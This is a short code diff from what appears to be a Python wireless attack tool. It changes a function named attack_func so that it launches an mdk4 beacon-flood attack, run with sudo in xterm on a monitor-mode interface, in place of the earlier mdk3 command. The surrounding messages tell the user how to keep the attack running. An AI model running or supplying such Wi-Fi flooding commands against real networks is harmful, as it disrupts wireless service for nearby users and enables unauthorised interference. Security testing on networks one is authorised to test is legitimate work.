@@ -329,7 +329,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
-            f"xterm -hold -e sudo mdk3 {network_interface}mon b -a -g -s 1000")
+            f"xterm -hold -e sudo mdk4 {network_interface}mon b -s 950")
         quit_program()
 
 
